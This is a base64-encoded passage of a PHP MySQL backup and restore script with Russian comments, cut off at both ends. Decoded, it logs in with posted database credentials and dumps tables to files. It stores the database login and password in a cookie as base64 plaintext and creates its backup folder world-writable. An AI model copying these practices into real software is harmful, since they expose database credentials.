0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhtGLKSwgY3AxMjUxIC0gd2luZG93cy0xMjUxLCDQuCDRgi7Qvy4KZGVmaW5lKCdDSEFSU0VUJywgJ2F1dG8nKTsKLy8g0JrQvtC00LjRgNC+0LLQutCwINGB0L7QtdC00LjQvdC10L3QuNGPINGBIE15U1FMINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4Ci8vINCd0LAg0YHQu9GD0YfQsNC5INC/0LXRgNC10L3QvtGB0LAg0YHQviDRgdGC0LDRgNGL0YUg0LLQtdGA0YHQuNC5IE15U1FMICjQtNC+IDQuMSksINGDINC60L7RgtC+0YDRi9GFINC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhiDQsiDQtNCw0LzQv9C1Ci8vINCf0YDQuCDQtNC+0LHQsNCy0LvQtdC90LjQuCAnZm9yY2VkLT4nLCDQuiDQv9GA0LjQvNC10YDRgyAnZm9yY2VkLT5jcDEyNTEnLCDQutC+0LTQuNGA0L7QstC60LAg0YLQsNCx0LvQuNGGINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4INCx0YPQtNC10YIg0L/RgNC40L3Rg9C00LjRgtC10LvRjNC90L4g0LfQsNC80LXQvdC10L3QsCDQvdCwIGNwMTI1MQovLyDQnNC+0LbQvdC+INGC0LDQutC20LUg0YPQutCw0LfRi9Cy0LDRgtGMINGB0YDQsNCy0L3QtdC90LjQtSDQvdGD0LbQvdC+0LUg0Log0L/RgNC40LzQtdGA0YMgJ2NwMTI1MV91a3JhaW5pYW5fY2knINC40LvQuCAnZm9yY2VkLT5jcDEyNTFfdWtyYWluaWFuX2NpJwpkZWZpbmUoJ1JFU1RPUkVfQ0hBUlNFVCcsICd1dGY4X2JpbicpOwovLyBzYXZlIHNldHRpbmdzIGFuZCBsYXN0IGFjdGlvbnMKLy8gMCAtIGRpc2FibGUsIDEgLSBlbmFibGUKZGVmaW5lKCdTQycsIDEpOwovLyBUYWJsZSB0eXBlcyBmb3Igc3RvcmUgc3RydWN0IG9ubHkgKHNlcGFyYXRlZCBieSBjb21tYSkKZGVmaW5lKCdPTkxZX0NSRUFURScsICdNUkdfTXlJU0FNLE1FUkdFLEhFQVAsTUVNT1JZJyk7Ci8vIEdsb2JhbCBzdGF0cwovLyAwIC0gZGlzYWJsZSwgMSAtIGVuYWJsZQpkZWZpbmUoJ0dTJywgMCk7CgovLyBFbmQgY29uZmlndXJhdGlvbiBibG9jayAtIHN0YXJ0IGNvZGUgYmxvY2sKJGR1bXBlcl9maWxlID0gYmFzZW5hbWUoX19GSUxFX18pOwoKJGlzX3NhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpID09ICcxJyA/IDEgOiAwOwppZiAoISRpc19zYWZlX21vZGUgJiYgZnVuY3Rpb25fZXhpc3RzKCdzZXRfdGltZV9saW1pdCcpKSBzZXRfdGltZV9saW1pdChUSU1FX0xJTUlUKTsKCmhlYWRlcigiRXhwaXJlczogVHVlLCAxIEp1bCAyMDAzIDA1OjAwOjAwIEdNVCIpOwpoZWFkZXIoIkxhc3QtTW9kaWZpZWQ6ICIgLiBnbWRhdGUoIkQsIGQgTSBZIEg6aTpzIikgLiAiIEdNVCIpOwpoZWFkZXIoIkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlIik7CmhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOwoKJHRpbWVyID0gYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpOwpvYl9pbXBsaWNpdF9mbHVzaCgpOwplcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKJGF1dGggPSAwOwokZXJyb3IgPSAnJzsKaWYgKCFlbXB0eSgkX1BPU1RbJ2xvZ2luJ10pICYmIGlzc2V0KCRfUE9TVFsncGFzcyddKSkgewogICAgICAgIGlmIChAbXlzcWxfY29ubmVjdChEQkhPU1QsICRfUE9TVFsnbG9naW4nXSwgJF9QT1NUWydwYXNzJ10pKXsKICAgICAgICAgICAgICAgIHNldGNvb2tpZSgic3hkIiwgYmFzZTY0X2VuY29kZSgiU0tEMTAxOnskX1BPU1RbJ2xvZ2luJ119OnskX1BPU1RbJ3Bhc3MnXX0iKSk7CiAgICAgICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkZHVtcGVyX2ZpbGUiKTsKICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CmVsc2VpZiAoIWVtcHR5KCRfQ09PS0lFWydzeGQnXSkpIHsKICAgICR1c2VyID0gZXhwbG9kZSgiOiIsIGJhc2U2NF9kZWNvZGUoJF9DT09LSUVbJ3N4ZCddKSk7CiAgICAgICAgaWYgKEBteXNxbF9jb25uZWN0KERCSE9TVCwgJHVzZXJbMV0sICR1c2VyWzJdKSl7CiAgICAgICAgICAgICAgICAkYXV0aCA9IDE7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CgppZiAoISRhdXRoIHx8IChpc3NldCgkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10pICYmICRfU0VSVkVSWydRVUVSWV9TVFJJTkcnXSA9PSAncmVsb2FkJykpIHsKICAgICAgICBzZXRjb29raWUoInN4ZCIpOwogICAgICAgIGVjaG8gdHBsX3BhZ2UodHBsX2F1dGgoJGVycm9yID8gdHBsX2Vycm9yKCRlcnJvcikgOiAnJyksICI8U0NSSVBUPmlmIChqc0VuYWJsZWQpIHtkb2N1bWVudC53cml0ZSgnPElOUFVUIFRZUEU9c3VibWl0IFZBTFVFPUFwcGx5PicpO308L1NDUklQVD4iKTsKICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVySFRNTCA9ICciIC4gcm91bmQoYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpIC0gJHRpbWVyLCA0KSAuICIgc2VjLic8L1NDUklQVD4iOwogICAgICAgIGV4aXQ7Cn0KaWYgKCFmaWxlX2V4aXN0cyhQQVRIKSAmJiAhJGlzX3NhZmVfbW9kZSkgewogICAgbWtkaXIoUEFUSCwgMDc3NykgfHwgdHJpZ2dlcl9lcnJvcigiQ2FuJ3QgY3JlYXRlIGRpciBmb3IgYmFja3VwIiwgRV9VU0VSX0VSUk9SKTsKfQoKJFNLID0gbmV3IGR1bXBlcigpOwpkZWZpbmUoJ0NfREVGQVVMVCcsIDEpOwpkZWZpbmUoJ0NfUkVTVUxUJywgMik7CmRlZmluZSgnQ19FUlJPUicsIDMpOwpkZWZpbmUoJ0NfV0FSTklORycsIDQpOwoKJGFjdGlvbiA9IGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pID8gJF9SRVFVRVNUWydhY3Rpb24nXSA6ICcnOwpzd2l0Y2goJGFjdGlvbil7CiAgICAgICAgY2FzZSAnYmFja3VwJzoKICAgICAgICAgICAgICAgICRTSy0+YmFja3VwKCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdyZXN0b3JlJzoKICAgICAgICAgICAgICAgICRTSy0+cmVzdG9yZSgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICRTSy0+bWFpbigpOwp9CgpteXNxbF9jbG9zZSgpOwoKZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZXInKS5pbm5lckhUTUwgPSAnIiAuIHJvdW5kKGFycmF5X3N1bShleHBsb2RlKCcgJywgbWljcm90aW1lKCkpKSAtICR0aW1lciwgNCkgLiAiIHNlYy4nPC9TQ1JJUFQ+IjsKCmNsYXNzIGR1bXBlciB7CiAgICAgICAgZnVuY3Rpb24gZHVtcGVyKCkgewogICAgICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiKSkgewogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnbGFzdF9hY3Rpb24nXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgPSA3OwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydsYXN0X2RiX3Jlc3RvcmUnXSA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAwOwoKICAgICAgICAgICAgICAgIC8vINCS0LXRgNGB0LjRjyBNeVNRTCDQstC40LTQsCA0MDEwMQogICAgICAgICAgICAgICAgcHJlZ19tYXRjaCgiL14oXGQrKVwuKFxkKylcLihcZCspLyIsIG15c3FsX2dldF9zZXJ2ZXJfaW5mbygpLCAkbSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+bXlzcWxfdmVyc2lvbiA9IHNwcmludGYoIiVkJTAyZCUwMmQiLCAkbVsxXSwgJG1bMl0sICRtWzNdKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+b25seV9jcmVhdGUgPSBleHBsb2RlKCcsJywgT05MWV9DUkVBVEUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZvcmNlZF9jaGFyc2V0ICA9IGZhbHNlOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NvbGxhdGUgPSAnJzsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXihmb3JjZWQtPik/KChbYS16MC05XSspKFxfXHcrKT8pJC8iLCBSRVNUT1JFX0NIQVJTRVQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm9yY2VkX2NoYXJzZXQgID0gJG1hdGNoZXNbMV0gPT0gJ2ZvcmNlZC0+JzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICRtYXRjaGVzWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlID0gIWVtcHR5KCRtYXRjaGVzWzRdKSA/ICcgQ09MTEFURSAnIC4gJG1hdGNoZXNbMl0gOiAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGJhY2t1cCgpIHsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxBIElEPXNhdmUgSFJFRj0nJyBTVFlMRT0nZGlzcGxheTogbm9uZTsnPkRvd25sb2FkIGZpbGU8L0E+ICZuYnNwOyA8SU5QVVQgSUQ9YmFjayBUWVBFPWJ1dHRvbiBWQUxVRT0nQmFjaycgRElTQUJMRUQgb25DbGljaz1cImhpc3RvcnkuYmFjaygpO1wiPiI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9wYWdlKHRwbF9wcm9jZXNzKCJEQiBiYWNrdXAgaW4gcHJvZ3Jlc3MiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gID0gaXNzZXQoJF9QT1NUWydkYl9iYWNrdXAnXSkgPyAkX1BPU1RbJ2RiX2JhY2t1cCddIDogJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWyd0YWJsZXNfZXhjbHVkZSddICA9ICFlbXB0eSgkX1BPU1RbJ3RhYmxlcyddKSAmJiAkX1BPU1RbJ3RhYmxlcyddezB9ID09ICdeJyA/IDEgOiAwOwogICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ3RhYmxlcyddKSA/ICRfUE9TVFsndGFibGVzJ10gOiAnJzsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gICAgID0gaXNzZXQoJF9QT1NUWydjb21wX21ldGhvZCddKSA/IGludHZhbCgkX1BPU1RbJ2NvbXBfbWV0aG9kJ10pIDogMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgICAgID0gaXNzZXQoJF9QT1NUWydjb21wX2xldmVsJ10pID8gaW50dmFsKCRfUE9TVFsnY29tcF9sZXZlbCddKSA6IDA7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fc2F2ZSgpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlcyddICAgICAgICAgID0gZXhwbG9kZSgiLCIsICR0aGlzLT5TRVRbJ3RhYmxlcyddKTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJF9QT1NUWyd0YWJsZXMnXSkpIHsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0aGlzLT5TRVRbJ3RhYmxlcyddIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9IHByZWdfcmVwbGFjZSgiL1teXHcqP15dLyIsICIiLCAkdGFibGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gYXJyYXkoICIvXD8vIiwgIi9cKi8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVwbGFjZSA9IGFycmF5KCAiLiIsICIuKj8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGJsc1tdID0gcHJlZ19yZXBsYWNlKCRwYXR0ZXJuLCAkcmVwbGFjZSwgJHRhYmxlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlc19leGNsdWRlJ10gPSAxOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX2xldmVsJ10gPT0gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGRiID0gJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXTsKCiAgICAgICAgICAgICAgICBpZiAoISRkYikgewogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCo0JjQkdCa0JAhINCd0LUg0YPQutCw0LfQsNC90LAg0LHQsNC30LAg0LTQsNC90L3Ri9GFISIsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkNvbm5lY3Rpb24gdG8gREIgYHskZGJ9YC4iKTsKICAgICAgICAgICAgICAgIG15c3FsX3NlbGVjdF9kYigkZGIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC1INGD0LTQsNC10YLRgdGPINCy0YvQsdGA0LDRgtGMINCx0LDQt9GDINC00LDQvdC90YvRhS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAkdGFibGVzID0gYXJyYXkoKTsKICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgVEFCTEVTIik7CiAgICAgICAgICAgICAgICAkYWxsID0gMDsKICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRibHMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YmxzIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4Y2x1ZGUgPSBwcmVnX21hdGNoKCIvXlxeLyIsICR0YWJsZSkgPyB0cnVlIDogZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkZXhjbHVkZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9eeyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0dXMgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsbCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZXhjbHVkZSAmJiBwcmVnX21hdGNoKCIveyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RhdHVzID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzdGF0dXMgPj0gJGFsbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGFibGVzW10gPSAkcm93WzBdOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgICAgICAgICAkdGFicyA9IGNvdW50KCR0YWJsZXMpOwogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LvQtdC90LjQtSDRgNCw0LfQvNC10YDQvtCyINGC0LDQsdC70LjRhgogICAgICAgICAgICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFIFNUQVRVUyIpOwogICAgICAgICAgICAgICAgJHRhYmluZm8gPSBhcnJheSgpOwogICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0ID0gYXJyYXkoKTsKICAgICAgICAgICAgICAgICR0YWJfdHlwZSA9IGFycmF5KCk7CiAgICAgICAgICAgICAgICAkdGFiaW5mb1swXSA9IDA7CiAgICAgICAgICAgICAgICAkaW5mbyA9ICcnOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hc3NvYygkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vcHJpbnRfcigkaXRlbSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGluX2FycmF5KCRpdGVtWydOYW1lJ10sICR0YWJsZXMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJ1Jvd3MnXSA9IGVtcHR5KCRpdGVtWydSb3dzJ10pID8gMCA6ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmluZm9bMF0gKz0gJGl0ZW1bJ1Jvd3MnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFiaW5mb1skaXRlbVsnTmFtZSddXSA9ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgKz0gJGl0ZW1bJ0RhdGFfbGVuZ3RoJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnNpemVbJGl0ZW1bJ05hbWUnXV0gPSAxICsgcm91bmQoTElNSVQgKiAxMDQ4NTc2IC8gKCRpdGVtWydBdmdfcm93X2xlbmd0aCddICsgMSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpdGVtWydSb3dzJ10pICRpbmZvIC49ICJ8IiAuICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkaXRlbVsnQ29sbGF0aW9uJ10pICYmIHByZWdfbWF0Y2goIi9eKFthLXowLTldKylfL2kiLCAkaXRlbVsnQ29sbGF0aW9uJ10sICRtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0WyRpdGVtWydOYW1lJ11dID0gJG1bMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJfdHlwZVskaXRlbVsnTmFtZSddXSA9IGlzc2V0KCRpdGVtWydFbmdpbmUnXSkgPyAkaXRlbVsnRW5naW5lJ10gOiAkaXRlbVsnVHlwZSddOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc2hvdyA9IDEwICsgJHRhYmluZm9bMF0gLyA1MDsKICAgICAgICAgICAgICAgICRpbmZvID0gJHRhYmluZm9bMF0gLiAkaW5mbzsKICAgICAgICAgICAgICAgICRuYW1lID0gJGRiIC4gJ18nIC4gZGF0ZSgiWS1tLWRfSC1pIik7CiAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJG5hbWUsICJ3Iik7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDcmVhdGUgZmlsZSB3aXRoIGJhY2t1cCBvZiBEQjo8QlI+XFxuICAtICB7JHRoaXMtPmZpbGVuYW1lfSIpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3dyaXRlKCRmcCwgIiNTS0QxMDF8eyRkYn18eyR0YWJzfXwiIC4gZGF0ZSgiWS5tLmQgSDppOnMiKSAuInx7JGluZm99XG5cbiIpOwogICAgICAgICAgICAgICAgJHQ9MDsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNFVCBTUUxfUVVPVEVfU0hPV19DUkVBVEUgPSAxIik7CiAgICAgICAgICAgICAgICAvLyDQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0L/QviDRg9C80L7Qu9GH0LDQvdC40Y4KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA+IDQwMTAxICYmIENIQVJTRVQgIT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiBDSEFSU0VUIC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9IENIQVJTRVQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJyc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHRhYmxlcyBBUyAkdGFibGUpewogICAgICAgICAgICAgICAgICAgICAgICAvLyDQktGL0YHRgtCw0LLQu9GP0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8g0YHQvtC+0YLQstC10YLRgdGC0LLRg9GO0YnRg9GOINC60L7QtNC40YDQvtCy0LrQtSDRgtCw0LHQu9C40YbRiwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENIQVJTRVQgPT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBteXNxbF9xdWVyeSgiU0VUIE5BTUVTICciIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAiJyIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C80LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRhYl9jaGFyc2V0WyR0YWJsZV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCdUYWJsZSBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuIENIQVJTRVQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCx0YDQsNCx0L7RgtC60LAg0YLQsNCx0LvQuNGG0YsgYHskdGFibGV9YCBbIiAuIGZuX2ludCgkdGFiaW5mb1skdGFibGVdKSAuICJdLiIpOwogICAgICAgICAgICAgICAgLy8gQ3JlYXRlIHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBDUkVBVEUgVEFCTEUgYHskdGFibGV9YCIpOwogICAgICAgICAgICAgICAgJHRhYiA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGFiID0gcHJlZ19yZXBsYWNlKCcvKGRlZmF1bHQgQ1VSUkVOVF9USU1FU1RBTVAgb24gdXBkYXRlIENVUlJFTlRfVElNRVNUQU1QfERFRkFVTFQgQ0hBUlNFVD1cdyt8Q09MTEFURT1cdyt8Y2hhcmFjdGVyIHNldCBcdyt8Y29sbGF0ZSBcdyspL2knLCAnLyohNDAxMDEgXFwxICovJywgJHRhYik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiRFJPUCBUQUJMRSBJRiBFWElTVFMgYHskdGFibGV9YDtcbnskdGFiWzFdfTtcblxuIik7CiAgICAgICAgICAgICAgICAvLyBDaGVjazogTmVlZCB0byBkdW1wIGRhdGE/CiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHRhYl90eXBlWyR0